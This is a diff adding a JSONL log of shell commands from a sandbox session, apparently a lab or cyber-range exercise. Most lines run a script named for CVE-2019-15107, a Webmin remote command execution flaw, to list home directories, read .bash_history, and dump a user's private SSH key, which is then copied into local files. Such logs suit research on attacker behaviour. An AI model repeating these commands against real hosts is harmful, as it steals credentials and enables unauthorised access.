@@ -1,0 +1,17 @@
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:17:52.528198+02:00", "cmd_type": "bash-command", "cmd": "ssh 10.1.18.22"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:18:02.772798+02:00", "cmd_type": "bash-command", "cmd": "ssh 10.1.17.4"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:19:20.946201+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ssh eve@10.1.17.4'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:19:55.032932+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:20:06.538892+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:20:35.635723+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:20:40.797070+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:20:47.220371+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:21:41.994313+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/bob'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:21:46.511107+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:22:35.856704+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve/.ssh/'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:23:00.711974+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:23:41.279759+02:00", "cmd_type": "bash-command", "cmd": "touch id_rsa"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:23:55.734992+02:00", "cmd_type": "bash-command", "cmd": "nano id_rsa"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:24:16.139084+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa.pub'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:24:33.691968+02:00", "cmd_type": "bash-command", "cmd": "touch id_rsa.pub"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:24:39.514538+02:00", "cmd_type": "bash-command", "cmd": "nano id_rsa.pub"}
